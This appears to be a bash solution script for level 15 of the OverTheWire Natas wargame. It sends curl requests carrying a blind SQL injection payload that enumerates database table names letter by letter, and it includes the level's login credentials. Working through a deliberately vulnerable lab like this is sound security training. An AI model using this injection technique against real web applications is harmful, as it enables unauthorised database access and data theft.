#!/bin/bash

# --proxy http://127.0.0.1:8082 \
# select * from <users> where username="natas16" union all select 1,2 from information_schema.tables;# \
for c in {{a..z},{A..Z}}; do
    RESULT=$(curl --location http://natas15.natas.labs.overthewire.org \
        --user natas15:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB \
        -d "$(printf 'username=" union all select 1,2 from information_schema.tables where substr(table_name,1,1)="%s";#' $c)" \
        2>/dev/null
    )
    # if $(echo "$RESULT" | grep -qv "doesn't"); then echo "$c: ok"; fi
    # echo "$RESULT"
    [ -z "$(echo "$RESULT" | grep "doesn't")" ] && echo $c: ok
done
